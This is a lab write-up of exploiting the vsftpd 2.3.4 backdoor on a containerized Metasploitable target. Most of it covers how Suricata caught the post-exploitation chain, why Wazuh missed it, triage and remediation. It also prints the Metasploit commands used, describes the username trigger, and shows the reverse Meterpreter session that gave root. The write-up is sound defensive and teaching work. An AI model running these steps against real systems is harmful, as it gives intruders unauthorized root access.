# 04 - vsftpd 2.3.4 Backdoor (RCE)

**MITRE ATT&CK:** T1190 Exploit Public-Facing Application (**CVE-2011-2523**); post-exploitation: T1105 Ingress Tool Transfer + reverse-shell C2
**Status:** VALIDATED - root shell obtained; network detection confirmed (via the post-exploitation chain)
**Attacker:** Kali `10.0.20.23` - **Target:** Metasploitable FTP `10.0.40.222:21`
**Primary detection:** Security Onion / Suricata - **Host detection (Wazuh):** none for the exploit (see Section 3)

A famous supply-chain backdoor: a tainted vsftpd 2.3.4 opens a root shell when a username containing `:)` is sent. This run landed a root session - and the detection story is richer than expected, because Suricata caught the *post-exploitation* chain rather than the trigger.

---

## 1. The attack

The Metasploitable container had to be **republished with port 6200** first - the backdoor binds its root shell on 6200, which wasn't in the original `docker run` port list (a container artifact worth noting). This build's Metasploit module delivered a **reverse Meterpreter** through the backdoor, so `LHOST` (Kali) was set:

```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.40.222
set LHOST 10.0.20.23
run
```

The backdoor spawned and a **root Meterpreter session** opened:

![root Meterpreter via vsftpd backdoor](https://github.com/user-attachments/assets/c66c3aba-7950-4dcf-8d5e-ca2325cf3b97)

```
getuid  -> Server username: root
sysinfo -> Computer: c73cfe125252 | OS: Ubuntu 8.04 (Linux 6.17.0-1017-aws)
```

**Two analyst notes:**
- **Containerization tell:** the userland is ancient *Ubuntu 8.04* (Metasploitable2) but the kernel is the modern *6.17.0-1017-aws* host kernel - the container shares the host's kernel. The hostname `c73cfe125252` is the container ID.
- The root shell is **inside the Metasploitable container**, not on the Docker host - relevant when scoping blast radius (a container escape would be a separate step).

---

## 2. Detection - Security Onion (Suricata)

Notably, **no dedicated vsftpd-backdoor signature fired.** Instead Suricata detected the **post-exploitation chain** - which is arguably more valuable, since a real attacker might evade an exploit-specific rule but still trip on payload staging and command output:

| Signature | SID | Severity | What it caught |
|---|---|---|---|
| ET INFO Executable and linking format (ELF) file download | 2000418 | **high** | the Meterpreter ELF payload being downloaded to the target (T1105 Ingress Tool Transfer) |
| ET HUNTING curl User-Agent to Dotted Quad | 2034567 | medium | the target using `curl` to a raw IP to fetch the payload |
| GPL ATTACK_RESPONSE id check returned root | 2100498 | medium | the `id` output (`uid=0(root)`) returning over the backdoor channel |

![Security Onion alerts - post-exploitation chain](https://github.com/user-attachments/assets/97200a2a-18d1-4421-8796-292db6e91b85)

**Hunt** shows the full connection chain in one view - the FTP trigger on `21`, the backdoor bind shell on `6200`, the ELF pulled over `8080`, and the reverse callback:

![Hunt - full connection chain](https://github.com/user-attachments/assets/df849e36-439a-4143-a94e-c94194d208cc)

Defense in depth across the kill chain: ingress tool transfer, the download method, and the root-command confirmation were each flagged, even without an exploit-trigger signature.

---

## 3. Host layer - Wazuh (blind to the exploit)

**Wazuh produced no alerts for the exploit** - it executed inside the **agentless Metasploitable container**, the same blind spot as recon ([WT01](../01-network-recon-nmap/)) and SQLi ([WT03](../03-web-sql-injection-dvwa/)).

The host events Wazuh *did* record - PAM session open/close and **"Successful sudo to ROOT executed"** (rule 5402) - are timestamped **13:30-13:31**, about four minutes **before** the 13:35 exploit. Those are the administrator's own `sudo docker` **republish commands from the test setup**, not the attack:

![Wazuh - administrative prep activity, not the exploit](https://github.com/user-attachments/assets/7561402b-6cf7-4eaa-8c2e-6072e7df0ce7)

![Wazuh - administrative prep activity, not the exploit](https://github.com/user-attachments/assets/759aaf68-d784-4687-ba23-48e5a3f76385)

> Reading "Successful sudo to ROOT" as the attack would be wrong - timing/correlation shows it's benign admin prep. The exploit itself left no Wazuh trace.

**The useful contrast:** Wazuh covers **host-level** privilege use (it would catch an attacker running `sudo` on the Docker host), but is blind to exploitation **inside a container**. Container-internal attacks need either an agent in the container or network monitoring - which is what caught this one.

---

## 4. Triage

Confirmed **RCE to root** (Meterpreter), with the attacker **staging a payload** (ELF download) and establishing **C2** (reverse session on 4444). The `id check returned root` alert is a high-confidence post-compromise indicator. Source `10.0.20.23` (internal). Isolate the target and, in production, rebuild it - treat any host that returned a root shell as fully compromised. Scope note: root is in the container, not the host.

---

## 5. Mitigation & remediation

- **Patch / upgrade** - never run a backdoored legacy vsftpd; this is the real fix.
- **Remove unnecessary services** - FTP rarely needs to be reachable at all.
- **Egress filtering** - blocking the target's outbound to arbitrary IPs/ports would have broken both the ELF download and the port-4444 callback.
- **Network segmentation** so a compromised host can't freely stage tools or call out.
- **Isolate and rebuild** any host confirmed shelled.
